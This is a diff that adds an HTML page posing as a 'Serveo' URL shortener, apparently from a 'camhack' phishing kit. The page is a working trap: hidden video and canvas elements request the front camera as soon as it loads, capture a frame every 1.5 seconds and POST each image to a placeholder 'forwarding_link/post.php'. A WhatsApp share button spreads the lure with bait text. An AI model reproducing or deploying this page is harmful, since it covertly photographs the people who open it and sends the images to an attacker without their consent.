@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>Serveo | URL Shortener</title>
+<meta property="og:type" content="website">
+<meta property="og:title" content="Serveo | ">
+<meta property="og:site_name" content="Serveo">
+<meta property="og:url" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" type="image/x-icon" href="camhack_html_files/serveo.ico">
+<link rel="stylesheet" type="text/css" href="camhack_html_files/style.css" media="screen">
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+</head>
+<body>		
+<div class="wrap">
+	<div class="cont"><span id="logo"><a href="forwarding_link" target="_blank"><span id="ln">Serveo</span><span id="lt">URL SHORTENER</span></a></span>
+<h1 id="ht">"redirect_link"</h1><a class="button" href="redirect_link" target="_blank" rel="nofollow" >Open</a></div>
+<div class="footer">
+	<div class="fpa">	
+		<div class="fic">
+							<a class="home button" href="forwarding_link" target="_blank">Home</a>
+						<a class="api button" href="redirect_link" target="_blank">Link</a>
+			<a class="gw button" target="_blank" href="whatsapp://send?text=I%20am%20the%20first%20one%20to%20send%20you%20this%20message%0A*Open%20Now*%F0%9F%91%87%F0%9F%91%87%F0%9F%91%87%20%0A%20forwarding_link">Shere</a>
+		</div>	
+		<div class="flc">
+			
+			<b>Serveo</b> © 2020		</div>
+	</div>
+	<div class="des">
+		The URL shortener Serveo at Serveourlshortener.net can be used to create free short URLs 
+(Uniform Resource Locators) or web page addresses that can be easily 
+shared, tweeted, or emailed to your friends. Enter a long URL, and you 
+will get a short URL you can use in its place<br>
+		Serveo | URL Shortener works as a conductor or proxy for a long URL. The shortener links the longer URL to the shortened version
+		<div class="breadcrumbs"><a href="forwarding_link" target="_blank">Home</a> » <a href="redirect_link" target="_blank">link</a></div>	</div>
+</div>
+</div>
+
+</body></html>
